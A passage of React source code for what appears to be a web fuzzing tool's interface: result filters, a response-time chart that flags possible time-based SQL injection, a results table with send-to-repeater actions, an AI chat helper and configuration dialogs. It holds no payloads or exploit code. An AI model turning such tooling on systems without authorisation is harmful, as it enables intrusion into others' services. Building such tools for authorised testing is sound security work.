                                showOnlyReflected: e.target.checked,
                                hideReflected: e.target.checked ? false : prev.hideReflected,
                              }))}
                              size="small"
                              color="warning"
                            />
                          }
                          label={
                            <Box sx={{ display: "flex", alignItems: "center", gap: 0.5 }}>
                              <Typography variant="body2">Reflected Only</Typography>
                              <Tooltip title="Show only responses where the payload is reflected back (potential XSS)">
                                <HelpOutlineIcon sx={{ fontSize: 14, color: "text.secondary" }} />
                              </Tooltip>
                            </Box>
                          }
                        />
                        <FormControlLabel
                          control={
                            <Checkbox
                              checked={resultFilter.hideReflected}
                              onChange={(e) => setResultFilter(prev => ({ 
                                ...prev, 
                                hideReflected: e.target.checked,
                                showOnlyReflected: e.target.checked ? false : prev.showOnlyReflected,
                              }))}
                              size="small"
                            />
                          }
                          label={
                            <Box sx={{ display: "flex", alignItems: "center", gap: 0.5 }}>
                              <Typography variant="body2">Hide Reflected</Typography>
                              <Tooltip title="Hide responses where the payload is reflected back (filter noise)">
                                <HelpOutlineIcon sx={{ fontSize: 14, color: "text.secondary" }} />
                              </Tooltip>
                            </Box>
                          }
                        />
                      </Box>
                    </Grid>

                    {/* Clear All Filters Button */}
                    <Grid item xs={12}>
                      <Box sx={{ display: "flex", justifyContent: "flex-end" }}>
                        <Button
                          size="small"
                          onClick={() => setResultFilter({
                            statusCode: "",
                            minLength: "",
                            maxLength: "",
                            interestingOnly: false,
                            excludeStatusCodes: "",
                            regexPattern: "",
                            excludePattern: "",
                            minResponseTime: "",
                            maxResponseTime: "",
                            contentType: "",
                            showOnlyErrors: false,
                            showOnlySuccess: false,
                            hideReflected: false,
                            showOnlyReflected: false,
                          })}
                          startIcon={<ClearIcon />}
                        >
                          Clear All Filters
                        </Button>
                      </Box>
                    </Grid>
                  </Grid>
                </Box>
              </Collapse>
            </CardContent>
          </Card>

          {/* Response Time Visualization Chart */}
          {results.length > 0 && (
            <Card sx={{ mb: 2 }}>
              <CardContent>
                <Box sx={{ display: "flex", alignItems: "center", justifyContent: "space-between", mb: 2 }}>
                  <Typography variant="h6" sx={{ display: "flex", alignItems: "center", gap: 1 }}>
                    <TimerIcon color="primary" />
                    Response Time Distribution
                  </Typography>
                  <Box sx={{ display: "flex", gap: 2, alignItems: "center" }}>
                    <Chip 
                      label={`Avg: ${Math.round(stats.avgResponseTime)}ms`}
                      size="small"
                      color="primary"
                      variant="outlined"
                    />
                    <Chip 
                      label={`Min: ${Math.min(...results.map(r => r.responseTime))}ms`}
                      size="small"
                      color="success"
                      variant="outlined"
                    />
                    <Chip 
                      label={`Max: ${Math.max(...results.map(r => r.responseTime))}ms`}
                      size="small"
                      color="error"
                      variant="outlined"
                    />
                  </Box>
                </Box>
                
                {/* Simple ASCII-style bar chart */}
                <Box sx={{ 
                  bgcolor: alpha(theme.palette.background.default, 0.5), 
                  p: 2, 
                  borderRadius: 2,
                  maxHeight: 200,
                  overflow: "auto",
                }}>
                  {(() => {
                    // Calculate response time buckets
                    const times = results.map(r => r.responseTime);
                    const maxTime = Math.max(...times);
                    const minTime = Math.min(...times);
                    const avgTime = times.reduce((a, b) => a + b, 0) / times.length;
                    const stdDev = Math.sqrt(times.reduce((sum, t) => sum + Math.pow(t - avgTime, 2), 0) / times.length);
                    
                    // Group into buckets
                    const bucketCount = Math.min(20, Math.ceil((maxTime - minTime) / 50) || 5);
                    const bucketSize = Math.ceil((maxTime - minTime) / bucketCount) || 100;
                    const buckets: { start: number; end: number; count: number; hasAnomaly: boolean }[] = [];
                    
                    for (let i = 0; i < bucketCount; i++) {
                      const start = minTime + (i * bucketSize);
                      const end = start + bucketSize;
                      const matching = results.filter(r => r.responseTime >= start && r.responseTime < end);
                      buckets.push({
                        start,
                        end,
                        count: matching.length,
                        hasAnomaly: matching.some(r => r.responseTime > avgTime + (2 * stdDev) || r.interesting),
                      });
                    }
                    
                    const maxCount = Math.max(...buckets.map(b => b.count));
                    
                    return (
                      <Box>
                        {/* Time-based anomaly detection hint */}
                        {times.some(t => t > avgTime + (2 * stdDev)) && (
                          <Alert severity="warning" sx={{ mb: 2 }}>
                            <Typography variant="body2">
                              <strong>Time-based anomaly detected!</strong> Some responses took significantly longer than average. 
                              This could indicate time-based SQL injection, resource-intensive operations, or server-side delays.
                            </Typography>
                          </Alert>
                        )}
                        
                        {/* Bar chart */}
                        <Grid container spacing={0.5}>
                          {buckets.map((bucket, i) => {
                            const barWidth = bucket.count > 0 ? Math.max((bucket.count / maxCount) * 100, 5) : 0;
                            return (
                              <Grid item xs={12} key={i}>
                                <Box sx={{ display: "flex", alignItems: "center", gap: 1, height: 24 }}>
                                  <Typography 
                                    variant="caption" 
                                    sx={{ width: 80, fontFamily: "monospace", textAlign: "right", color: "text.secondary" }}
                                  >
                                    {Math.round(bucket.start)}-{Math.round(bucket.end)}ms
                                  </Typography>
                                  <Tooltip title={`${bucket.count} responses in this range${bucket.hasAnomaly ? " (contains anomalies)" : ""}`}>
                                    <Box
                                      sx={{
                                        width: `${barWidth}%`,
                                        minWidth: bucket.count > 0 ? 4 : 0,
                                        height: 16,
                                        bgcolor: bucket.hasAnomaly 
                                          ? "error.main" 
                                          : bucket.start > avgTime 
                                            ? "warning.main" 
                                            : "success.main",
                                        borderRadius: 1,
                                        transition: "width 0.3s ease",
                                        cursor: "pointer",
                                        "&:hover": { opacity: 0.8 },
                                      }}
                                    />
                                  </Tooltip>
                                  <Typography variant="caption" sx={{ minWidth: 30, fontFamily: "monospace" }}>
                                    {bucket.count}
                                  </Typography>
                                </Box>
                              </Grid>
                            );
                          })}
                        </Grid>
                        
                        {/* Legend */}
                        <Box sx={{ display: "flex", gap: 3, mt: 2, pt: 2, borderTop: `1px solid ${alpha("#000", 0.1)}` }}>
                          <Box sx={{ display: "flex", alignItems: "center", gap: 0.5 }}>
                            <Box sx={{ width: 12, height: 12, bgcolor: "success.main", borderRadius: 0.5 }} />
                            <Typography variant="caption">Below average</Typography>
                          </Box>
                          <Box sx={{ display: "flex", alignItems: "center", gap: 0.5 }}>
                            <Box sx={{ width: 12, height: 12, bgcolor: "warning.main", borderRadius: 0.5 }} />
                            <Typography variant="caption">Above average</Typography>
                          </Box>
                          <Box sx={{ display: "flex", alignItems: "center", gap: 0.5 }}>
                            <Box sx={{ width: 12, height: 12, bgcolor: "error.main", borderRadius: 0.5 }} />
                            <Typography variant="caption">Contains anomalies (2+ std dev)</Typography>
                          </Box>
                        </Box>
                      </Box>
                    );
                  })()}
                </Box>

                {/* Slow response highlight */}
                {(() => {
                  const times = results.map(r => r.responseTime);
                  const avgTime = times.reduce((a, b) => a + b, 0) / times.length;
                  const stdDev = Math.sqrt(times.reduce((sum, t) => sum + Math.pow(t - avgTime, 2), 0) / times.length);
                  const slowResponses = results.filter(r => r.responseTime > avgTime + (2 * stdDev));
                  
                  if (slowResponses.length === 0) return null;
                  
                  return (
                    <Box sx={{ mt: 2 }}>
                      <Typography variant="subtitle2" fontWeight={600} sx={{ mb: 1, display: "flex", alignItems: "center", gap: 1 }}>
                        <WarningAmberIcon color="warning" fontSize="small" />
                        Slow Responses ({slowResponses.length}) - Potential Time-Based Vulnerability
                      </Typography>
                      <Box sx={{ display: "flex", gap: 1, flexWrap: "wrap" }}>
                        {slowResponses.slice(0, 10).map((r, i) => (
                          <Chip
                            key={i}
                            label={`${r.payload.slice(0, 20)}${r.payload.length > 20 ? "..." : ""} (${r.responseTime}ms)`}
                            size="small"
                            color="warning"
                            variant="outlined"
                            onClick={() => viewResponseDetails(r)}
                            sx={{ cursor: "pointer", fontFamily: "monospace" }}
                          />
                        ))}
                        {slowResponses.length > 10 && (
                          <Chip label={`+${slowResponses.length - 10} more`} size="small" />
                        )}
                      </Box>
                    </Box>
                  );
                })()}
              </CardContent>
            </Card>
          )}

          {/* Results Table */}
          {results.length === 0 ? (
            <Paper sx={{ p: 4, textAlign: "center" }}>
              <BugReportIcon sx={{ fontSize: 64, color: "text.disabled", mb: 2 }} />
              <Typography color="text.secondary">
                No results yet. Configure your fuzzing parameters and click Start.
              </Typography>
            </Paper>
          ) : (
            <TableContainer component={Paper}>
              <Table size="small">
                <TableHead>
                  <TableRow>
                    <TableCell>Payload</TableCell>
                    <TableCell align="center">Status</TableCell>
                    <TableCell align="right">Length</TableCell>
                    <TableCell align="right">Time (ms)</TableCell>
                    <TableCell>Flags</TableCell>
                    <TableCell align="center">Actions</TableCell>
                  </TableRow>
                </TableHead>
                <TableBody>
                  {filteredResults.slice(0, 100).map((result) => (
                    <TableRow
                      key={result.id}
                      sx={{
                        bgcolor: result.interesting ? alpha("#f59e0b", 0.05) : "inherit",
                        "&:hover": { bgcolor: alpha(theme.palette.primary.main, 0.05) },
                      }}
                    >
                      <TableCell>
                        <Typography
                          variant="body2"
                          sx={{
                            fontFamily: "monospace",
                            maxWidth: 300,
                            overflow: "hidden",
                            textOverflow: "ellipsis",
                            whiteSpace: "nowrap",
                          }}
                        >
                          {result.payload}
                        </Typography>
                      </TableCell>
                      <TableCell align="center">
                        <Chip
                          label={result.statusCode}
                          size="small"
                          sx={{
                            bgcolor: alpha(getStatusColor(result.statusCode), 0.15),
                            color: getStatusColor(result.statusCode),
                            fontWeight: 600,
                          }}
                        />
                      </TableCell>
                      <TableCell align="right">
                        <Typography variant="body2">{result.responseLength}</Typography>
                      </TableCell>
                      <TableCell align="right">
                        <Typography variant="body2">{result.responseTime}</Typography>
                      </TableCell>
                      <TableCell>
                        {result.interesting && (
                          <Chip label="Interesting" size="small" color="warning" sx={{ mr: 0.5 }} />
                        )}
                        {result.flags.map((flag, i) => (
                          <Chip key={i} label={flag} size="small" color="error" variant="outlined" sx={{ mr: 0.5 }} />
                        ))}
                      </TableCell>
                      <TableCell align="center">
                        <Tooltip title="View Response">
                          <IconButton
                            size="small"
                            onClick={() => viewResponseDetails(result)}
                            color="primary"
                          >
                            <VisibilityIcon fontSize="small" />
                          </IconButton>
                        </Tooltip>
                        <Tooltip title="Send to Repeater">
                          <IconButton
                            size="small"
                            onClick={() => sendToRepeater(result)}
                            color="secondary"
                          >
                            <RefreshIcon fontSize="small" />
                          </IconButton>
                        </Tooltip>
                        {compareMode && (
                          <Tooltip title={
                            compareResults[0]?.id === result.id || compareResults[1]?.id === result.id
                              ? "Selected for comparison"
                              : "Select for comparison"
                          }>
                            <Checkbox
                              size="small"
                              checked={compareResults[0]?.id === result.id || compareResults[1]?.id === result.id}
                              onChange={() => toggleCompareResult(result)}
                            />
                          </Tooltip>
                        )}
                        <Tooltip title="Copy payload">
                          <IconButton
                            size="small"
                            onClick={() => navigator.clipboard.writeText(result.payload)}
                          >
                            <ContentCopyIcon fontSize="small" />
                          </IconButton>
                        </Tooltip>
                      </TableCell>
                    </TableRow>
                  ))}
                </TableBody>
              </Table>
              {filteredResults.length > 100 && (
                <Box sx={{ p: 2, textAlign: "center" }}>
                  <Typography variant="body2" color="text.secondary">
                    Showing 100 of {filteredResults.length} results. Export to see all.
                  </Typography>
                </Box>
              )}
            </TableContainer>
          )}
        </Box>
      )}

      {/* AI Chat Panel */}
      {results.length > 0 && (
        <Paper
          elevation={6}
          sx={{
            position: "fixed",
            bottom: 16,
            right: 16,
            left: chatMaximized ? { xs: 16, md: 256 } : "auto",
            width: chatMaximized ? "auto" : { xs: "calc(100% - 32px)", sm: 400 },
            maxWidth: chatMaximized ? "none" : 400,
            zIndex: 1200,
            borderRadius: 3,
            overflow: "hidden",
            boxShadow: "0 4px 30px rgba(0,0,0,0.3)",
            transition: "all 0.3s cubic-bezier(0.4, 0, 0.2, 1)",
          }}
        >
          {/* Chat Header */}
          <Box
            onClick={() => !chatMaximized && setChatOpen(!chatOpen)}
            sx={{
              p: 1.5,
              background: "linear-gradient(135deg, #f97316 0%, #ea580c 100%)",
              color: "white",
              cursor: chatMaximized ? "default" : "pointer",
              display: "flex",
              alignItems: "center",
              justifyContent: "space-between",
              "&:hover": { filter: chatMaximized ? "none" : "brightness(1.1)" },
            }}
          >
            <Box
              onClick={() => chatMaximized && setChatOpen(!chatOpen)}
              sx={{ display: "flex", alignItems: "center", gap: 1, cursor: "pointer", flex: 1 }}
            >
              <ChatIcon fontSize="small" />
              <Typography variant="body2" sx={{ fontWeight: 600 }}>
                AI Chat
              </Typography>
              {results.length > 0 && (
                <Chip
                  label={results.length}
                  size="small"
                  sx={{ bgcolor: "rgba(255,255,255,0.2)", color: "white", height: 20, "& .MuiChip-label": { px: 1, fontSize: "0.7rem" } }}
                />
              )}
            </Box>
            <Box sx={{ display: "flex", alignItems: "center", gap: 0.5 }}>
              <IconButton
                size="small"
                sx={{ color: "white", p: 0.5 }}
                onClick={(e) => {
                  e.stopPropagation();
                  if (!chatOpen) setChatOpen(true);
                  setChatMaximized(!chatMaximized);
                }}
              >
                {chatMaximized ? <CloseFullscreenIcon fontSize="small" /> : <OpenInFullIcon fontSize="small" />}
              </IconButton>
              <IconButton
                size="small"
                sx={{ color: "white", p: 0.5 }}
                onClick={(e) => {
                  e.stopPropagation();
                  setChatOpen(!chatOpen);
                }}
              >
                {chatOpen ? <ExpandMoreIcon fontSize="small" /> : <ExpandLessIcon fontSize="small" />}
              </IconButton>
            </Box>
          </Box>

          {/* Chat Content */}
          <Collapse in={chatOpen}>
            {/* Messages Area */}
            <Box
              sx={{
                height: chatMaximized ? "calc(66vh - 120px)" : 280,
                overflowY: "auto",
                p: 2,
                bgcolor: alpha(theme.palette.background.default, 0.98),
                transition: "height 0.3s cubic-bezier(0.4, 0, 0.2, 1)",
              }}
            >
              {/* Welcome message */}
              {chatMessages.length === 0 && (
                <Box sx={{ textAlign: "center", py: chatMaximized ? 6 : 2 }}>
                  <SmartToyIcon sx={{ fontSize: 48, color: "text.disabled", mb: 1 }} />
                  <Typography variant="body2" color="text.secondary" sx={{ mb: 2 }}>
                    I can help you understand your fuzzing results and identify potential vulnerabilities!
                  </Typography>
                  <Box sx={{ display: "flex", flexDirection: "column", gap: 1, alignItems: "center" }}>
                    {[
                      "Give me a summary of the results",
                      "What vulnerabilities did you find?",
                      "What should I investigate next?",
                      "Explain the attack modes",
                      "How do I interpret response lengths?",
                    ].map((suggestion, i) => (
                      <Chip
                        key={i}
                        label={suggestion}
                        variant="outlined"
                        size="small"
                        onClick={() => {
                          setChatInput(suggestion);
                        }}
                        sx={{ cursor: "pointer", "&:hover": { bgcolor: alpha(theme.palette.primary.main, 0.1) } }}
                      />
                    ))}
                  </Box>
                </Box>
              )}

              {/* Chat Messages */}
              {chatMessages.map((msg, i) => (
                <Box
                  key={i}
                  sx={{
                    display: "flex",
                    justifyContent: msg.role === "user" ? "flex-end" : "flex-start",
                    mb: 2,
                  }}
                >
                  <Box
                    sx={{
                      maxWidth: "85%",
                      display: "flex",
                      gap: 1,
                      flexDirection: msg.role === "user" ? "row-reverse" : "row",
                    }}
                  >
                    <Box
                      sx={{
                        width: 32,
                        height: 32,
                        borderRadius: "50%",
                        bgcolor: msg.role === "user" ? "#f97316" : "#8b5cf6",
                        display: "flex",
                        alignItems: "center",
                        justifyContent: "center",
                        flexShrink: 0,
                      }}
                    >
                      {msg.role === "user" ? (
                        <PersonIcon sx={{ fontSize: 18, color: "white" }} />
                      ) : (
                        <SmartToyIcon sx={{ fontSize: 18, color: "white" }} />
                      )}
                    </Box>
                    <Paper
                      sx={{
                        p: 1.5,
                        bgcolor: msg.role === "user" ? "#f97316" : theme.palette.background.paper,
                        color: msg.role === "user" ? "white" : "text.primary",
                        borderRadius: 2,
                        "& p": { m: 0 },
                        "& p:not(:last-child)": { mb: 1 },
                        "& h2": { fontSize: "1.1rem", fontWeight: 700, mb: 1 },
                        "& h3": { fontSize: "1rem", fontWeight: 600, mb: 0.5 },
                        "& ul, & ol": { pl: 2, m: 0 },
                        "& li": { mb: 0.5 },
                        "& strong": { fontWeight: 600 },
                      }}
                    >
                      <ReactMarkdown
                        components={{
                          code: ({ className, children }) => (
                            <ChatCodeBlock className={className} theme={theme}>
                              {children}
                            </ChatCodeBlock>
                          ),
                        }}
                      >
                        {msg.content}
                      </ReactMarkdown>
                    </Paper>
                  </Box>
                </Box>
              ))}
              
              {/* Loading indicator */}
              {chatLoading && (
                <Box sx={{ display: "flex", gap: 1, alignItems: "center" }}>
                  <Box
                    sx={{
                      width: 32,
                      height: 32,
                      borderRadius: "50%",
                      bgcolor: "#8b5cf6",
                      display: "flex",
                      alignItems: "center",
                      justifyContent: "center",
                    }}
                  >
                    <SmartToyIcon sx={{ fontSize: 18, color: "white" }} />
                  </Box>
                  <Paper sx={{ p: 1.5, borderRadius: 2 }}>
                    <CircularProgress size={16} />
                  </Paper>
                </Box>
              )}
              
              <div ref={chatEndRef} />
            </Box>

            {/* Input Area */}
            <Box
              sx={{
                p: 2,
                borderTop: `1px solid ${theme.palette.divider}`,
                bgcolor: theme.palette.background.paper,
                display: "flex",
                gap: 1,
              }}
            >
              <TextField
                fullWidth
                size="small"
                placeholder="Ask about your fuzzing results..."
                value={chatInput}
                onChange={(e) => setChatInput(e.target.value)}
                onKeyPress={(e) => e.key === "Enter" && sendChatMessage()}
                disabled={chatLoading}
              />
              <Button
                variant="contained"
                onClick={sendChatMessage}
                disabled={!chatInput.trim() || chatLoading}
                sx={{
                  background: "linear-gradient(135deg, #f97316 0%, #ea580c 100%)",
                  "&:hover": {
                    background: "linear-gradient(135deg, #ea580c 0%, #c2410c 100%)",
                  },
                }}
              >
                <SendIcon />
              </Button>
            </Box>
          </Collapse>
        </Paper>
      )}

      {/* Wordlist Dialog */}
      <Dialog open={showWordlistDialog} onClose={() => setShowWordlistDialog(false)} maxWidth="md" fullWidth>
        <DialogTitle>Select Wordlist</DialogTitle>
        <DialogContent>
          <Grid container spacing={2} sx={{ mt: 1 }}>
            {BUILTIN_WORDLISTS.map((wordlist) => (
              <Grid item xs={12} sm={6} key={wordlist.name}>
                <Card
                  sx={{
                    cursor: "pointer",
                    "&:hover": { borderColor: theme.palette.primary.main },
                  }}
                  variant="outlined"
                  onClick={() => loadWordlist(wordlist, 0)}
                >
                  <CardContent sx={{ py: 1.5 }}>
                    <Typography variant="subtitle2">{wordlist.name}</Typography>
                    <Typography variant="caption" color="text.secondary">
                      {wordlist.count} payloads • {wordlist.category}
                    </Typography>
                  </CardContent>
                </Card>
              </Grid>
            ))}
          </Grid>
        </DialogContent>
        <DialogActions>
          <Button onClick={() => setShowWordlistDialog(false)}>Cancel</Button>
        </DialogActions>
      </Dialog>
      
      {/* Save Configuration Dialog */}
      <Dialog open={saveConfigDialog} onClose={() => setSaveConfigDialog(false)} maxWidth="sm" fullWidth>
        <DialogTitle sx={{ display: "flex", alignItems: "center", gap: 1 }}>
          <SaveIcon color="primary" />
          Save Fuzzing Configuration
        </DialogTitle>
        <DialogContent>
          <Alert severity="info" sx={{ mb: 2 }}>
            Save your current configuration to reuse it later. Includes target URL, positions, payloads, and all settings.
          </Alert>
          <TextField
            fullWidth
            label="Configuration Name"
            value={configName}
            onChange={(e) => setConfigName(e.target.value)}
            placeholder="e.g., API User Endpoint SQLi Test"
            sx={{ mb: 2 }}
            autoFocus
          />
          <TextField
            fullWidth
            label="Description (optional)"
            value={configDescription}
            onChange={(e) => setConfigDescription(e.target.value)}
            placeholder="Brief description of this test configuration"
            multiline
            rows={2}
          />
          <Box sx={{ mt: 2, p: 2, bgcolor: "action.hover", borderRadius: 1 }}>
            <Typography variant="caption" color="text.secondary" sx={{ display: "block", mb: 1 }}>
              Configuration Summary:
            </Typography>
            <Typography variant="body2">
              • Target: <code>{config.targetUrl || "Not set"}</code>
            </Typography>
            <Typography variant="body2">
              • Method: {config.method}
            </Typography>
            <Typography variant="body2">
              • Positions: {config.positions.length}
            </Typography>
            <Typography variant="body2">
              • Attack Mode: {config.attackMode}
            </Typography>
            <Typography variant="body2">
              • Total Payloads: {config.payloads.reduce((sum, p) => sum + p.length, 0)}
            </Typography>
          </Box>
        </DialogContent>
        <DialogActions>
          <Button onClick={() => setSaveConfigDialog(false)}>Cancel</Button>
          <Button 
            variant="contained" 
            onClick={saveConfiguration}
            disabled={!configName.trim()}
            startIcon={<SaveIcon />}
          >
            Save Configuration
          </Button>
        </DialogActions>
      </Dialog>
      
      {/* Load Configuration Dialog */}
      <Dialog open={loadConfigDialog} onClose={() => setLoadConfigDialog(false)} maxWidth="md" fullWidth>
        <DialogTitle sx={{ display: "flex", alignItems: "center", gap: 1 }}>
          <FolderOpenIcon color="primary" />
          Load Saved Configuration
        </DialogTitle>
        <DialogContent>
          {savedConfigs.length === 0 ? (
            <Alert severity="info">
              No saved configurations yet. Create a configuration and save it to see it here.
            </Alert>
          ) : (
            <List>
              {savedConfigs.map((saved) => (
                <Paper key={saved.id} sx={{ mb: 1.5, overflow: "hidden" }}>
                  <ListItem
                    sx={{ 
                      py: 2,
                      "&:hover": { bgcolor: alpha(theme.palette.primary.main, 0.05) },
                    }}
                  >
                    <ListItemIcon>
                      <FolderOpenIcon color="primary" />
                    </ListItemIcon>
                    <ListItemText
                      primary={
                        <Typography variant="subtitle1" fontWeight={600}>
                          {saved.name}
                        </Typography>
                      }
                      secondary={
                        <Box sx={{ mt: 0.5 }}>
                          {saved.description && (
                            <Typography variant="body2" color="text.secondary" sx={{ mb: 1 }}>
                              {saved.description}
                            </Typography>
                          )}
                          <Box sx={{ display: "flex", gap: 1, flexWrap: "wrap" }}>
                            <Chip 
                              size="small" 
                              icon={<HttpIcon />}
                              label={saved.config.method}
                            />
                            <Chip 
                              size="small" 
                              label={`${saved.config.attackMode} mode`}
                            />
                            <Chip 
                              size="small" 
                              label={`${saved.config.positions.length} positions`}
                            />
                            <Chip 
                              size="small" 
                              icon={<AccessTimeIcon />}
                              label={new Date(saved.savedAt).toLocaleDateString()}
                            />
                          </Box>
                          <Typography 
                            variant="caption" 
                            sx={{ 
                              display: "block", 
                              mt: 1,
                              fontFamily: "monospace",
                              color: "text.secondary",
                            }}
                          >
                            {saved.config.targetUrl}
                          </Typography>
                        </Box>
                      }
                    />
                    <Box sx={{ display: "flex", gap: 1 }}>
                      <Button
                        variant="contained"
                        size="small"
                        onClick={() => loadConfiguration(saved)}
                        startIcon={<FolderOpenIcon />}
                      >
                        Load
                      </Button>
                      <IconButton
                        size="small"
                        color="error"
                        onClick={() => deleteConfiguration(saved.id)}
                      >
                        <DeleteIcon />
                      </IconButton>
                    </Box>
                  </ListItem>
                </Paper>
              ))}
            </List>
          )}
        </DialogContent>
        <DialogActions>
          <Button onClick={() => setLoadConfigDialog(false)}>Close</Button>
        </DialogActions>
      </Dialog>
      
      {/* Response Detail Dialog */}
      <Dialog 
        open={responseDialogOpen} 
        onClose={() => setResponseDialogOpen(false)} 
        maxWidth="lg" 
        fullWidth
        PaperProps={{ sx: { minHeight: "70vh" } }}
      >
        <DialogTitle sx={{ display: "flex", alignItems: "center", justifyContent: "space-between" }}>
          <Box sx={{ display: "flex", alignItems: "center", gap: 1 }}>
            <VisibilityIcon color="primary" />
            Response Details
          </Box>
          {selectedResult && (
            <Chip 
              label={selectedResult.statusCode}
              color={selectedResult.statusCode < 300 ? "success" : selectedResult.statusCode < 400 ? "warning" : "error"}
            />
          )}
        </DialogTitle>
        <DialogContent dividers>
          {selectedResult && (
            <Grid container spacing={3}>
              {/* Request Info */}
              <Grid item xs={12}>
                <Typography variant="h6" gutterBottom sx={{ display: "flex", alignItems: "center", gap: 1 }}>
                  <SendIcon fontSize="small" />
                  Request
                </Typography>
                <Paper variant="outlined" sx={{ p: 2, bgcolor: alpha("#3b82f6", 0.05) }}>
                  <Grid container spacing={2}>
                    <Grid item xs={12} sm={6}>
                      <Typography variant="caption" color="text.secondary">Payload</Typography>
                      <Typography 
                        variant="body2" 
                        sx={{ 
                          fontFamily: "monospace", 
                          bgcolor: "action.hover", 
                          p: 1, 
                          borderRadius: 1,
                          wordBreak: "break-all",
                        }}
                      >
                        {selectedResult.payload}
                      </Typography>
                    </Grid>
                    <Grid item xs={6} sm={3}>
                      <Typography variant="caption" color="text.secondary">Method</Typography>
                      <Typography variant="body2" fontWeight={600}>{config.method}</Typography>
                    </Grid>
                    <Grid item xs={6} sm={3}>
                      <Typography variant="caption" color="text.secondary">Timestamp</Typography>
                      <Typography variant="body2">
                        {new Date(selectedResult.timestamp).toLocaleString()}
                      </Typography>
                    </Grid>
                    <Grid item xs={12}>
                      <Typography variant="caption" color="text.secondary">Target URL</Typography>
                      <Typography variant="body2" sx={{ fontFamily: "monospace", wordBreak: "break-all" }}>
                        {config.targetUrl}
                      </Typography>
                    </Grid>
                  </Grid>
                </Paper>
              </Grid>
              
              {/* Response Summary */}
              <Grid item xs={12}>
                <Typography variant="h6" gutterBottom sx={{ display: "flex", alignItems: "center", gap: 1 }}>
                  <HttpIcon fontSize="small" />
                  Response Summary
                </Typography>
                <Grid container spacing={2}>
                  <Grid item xs={6} sm={3}>
                    <Paper sx={{ p: 2, textAlign: "center", bgcolor: alpha(getStatusColor(selectedResult.statusCode), 0.1) }}>
                      <Typography variant="caption" color="text.secondary">Status Code</Typography>
                      <Typography 
                        variant="h4" 
                        fontWeight={700} 
                        sx={{ color: getStatusColor(selectedResult.statusCode) }}
                      >
                        {selectedResult.statusCode}
                      </Typography>
                    </Paper>
                  </Grid>
                  <Grid item xs={6} sm={3}>
                    <Paper sx={{ p: 2, textAlign: "center" }}>
                      <Typography variant="caption" color="text.secondary">Response Length</Typography>
                      <Typography variant="h4" fontWeight={700}>{selectedResult.responseLength}</Typography>
                      <Typography variant="caption" color="text.secondary">bytes</Typography>
                    </Paper>
                  </Grid>
                  <Grid item xs={6} sm={3}>
                    <Paper sx={{ p: 2, textAlign: "center" }}>
                      <Typography variant="caption" color="text.secondary">Response Time</Typography>
                      <Typography variant="h4" fontWeight={700}>{selectedResult.responseTime}</Typography>
                      <Typography variant="caption" color="text.secondary">ms</Typography>
                    </Paper>
                  </Grid>
                  <Grid item xs={6} sm={3}>
                    <Paper sx={{ p: 2, textAlign: "center" }}>
                      <Typography variant="caption" color="text.secondary">Content Type</Typography>
                      <Typography variant="body1" fontWeight={600}>{selectedResult.contentType}</Typography>
                    </Paper>
                  </Grid>
                </Grid>
              </Grid>
              
              {/* Flags */}
              {(selectedResult.interesting || selectedResult.flags.length > 0) && (
                <Grid item xs={12}>
                  <Typography variant="h6" gutterBottom sx={{ display: "flex", alignItems: "center", gap: 1 }}>
                    <WarningAmberIcon fontSize="small" color="warning" />
                    Flags & Indicators
                  </Typography>
                  <Box sx={{ display: "flex", gap: 1, flexWrap: "wrap" }}>
                    {selectedResult.interesting && (
                      <Chip label="⚠️ Interesting Response" color="warning" />
                    )}
                    {selectedResult.flags.map((flag, i) => (
                      <Chip key={i} label={flag} color="error" variant="outlined" />
                    ))}
                  </Box>
                </Grid>
              )}
              
              {/* Response Headers */}
              <Grid item xs={12}>
                <Typography variant="h6" gutterBottom sx={{ display: "flex", alignItems: "center", gap: 1 }}>
                  <ListAltIcon fontSize="small" />
                  Response Headers
                </Typography>
                <Paper variant="outlined" sx={{ maxHeight: 200, overflow: "auto" }}>
                  <Table size="small">
                    <TableHead>
                      <TableRow>
                        <TableCell sx={{ fontWeight: 700 }}>Header</TableCell>
                        <TableCell sx={{ fontWeight: 700 }}>Value</TableCell>
                      </TableRow>
                    </TableHead>
                    <TableBody>
                      {Object.entries(selectedResult.headers).map(([key, value]) => (
                        <TableRow key={key}>
                          <TableCell sx={{ fontFamily: "monospace", color: "primary.main" }}>{key}</TableCell>
                          <TableCell sx={{ fontFamily: "monospace" }}>{value}</TableCell>
                        </TableRow>
                      ))}
                    </TableBody>
                  </Table>
                </Paper>
              </Grid>
              
              {/* Response Body */}
              <Grid item xs={12}>
                <Typography variant="h6" gutterBottom sx={{ display: "flex", alignItems: "center", gap: 1 }}>
                  <CodeIcon fontSize="small" />
                  Response Body
                </Typography>
                <Paper 
                  variant="outlined" 
                  sx={{ 
                    p: 2, 
                    bgcolor: "#1e1e1e",
                    maxHeight: 400, 
                    overflow: "auto",
                  }}
                >
                  <Typography
                    component="pre"
                    sx={{
                      fontFamily: "monospace",
                      fontSize: "0.85rem",
                      color: "#d4d4d4",
                      whiteSpace: "pre-wrap",
                      wordBreak: "break-all",
                      m: 0,
                    }}
                  >
                    {selectedResult.body || "(No response body captured)"}
                  </Typography>
                </Paper>
              </Grid>
            </Grid>
          )}
        </DialogContent>
        <DialogActions>
          <Button
            startIcon={<RefreshIcon />}
            onClick={() => {
              if (selectedResult) {
                sendToRepeater(selectedResult);
                setResponseDialogOpen(false);
              }
            }}
            color="secondary"
          >
            Send to Repeater
          </Button>
          <Button
            startIcon={<ContentCopyIcon />}
            onClick={() => {
              if (selectedResult) {
                const data = JSON.stringify({
                  payload: selectedResult.payload,
                  statusCode: selectedResult.statusCode,
                  headers: selectedResult.headers,
                  body: selectedResult.body,
                }, null, 2);
                navigator.clipboard.writeText(data);
              }
            }}
          >
            Copy as JSON
          </Button>
          <Button
            startIcon={<ContentCopyIcon />}
            onClick={() => {
              if (selectedResult?.body) {
                navigator.clipboard.writeText(selectedResult.body);
              }
            }}
            disabled={!selectedResult?.body}
          >
            Copy Body
          </Button>
          <Button onClick={() => setResponseDialogOpen(false)} variant="contained">
            Close
          </Button>
        </DialogActions>
      </Dialog>

      {/* Tab 6: Smart Detection */}
      {activeTab === 6 && (
        <Box>
          <Grid container spacing={3}>
            {/* Smart Detection Controls */}
            <Grid item xs={12}>
              <Card sx={{ background: `linear-gradient(135deg, ${alpha(theme.palette.primary.main, 0.05)} 0%, ${alpha(theme.palette.secondary.main, 0.05)} 100%)` }}>
                <CardContent>
                  <Box sx={{ display: "flex", justifyContent: "space-between", alignItems: "center", mb: 2 }}>
                    <Box>
                      <Typography variant="h5" fontWeight={700} sx={{ display: "flex", alignItems: "center", gap: 1 }}>
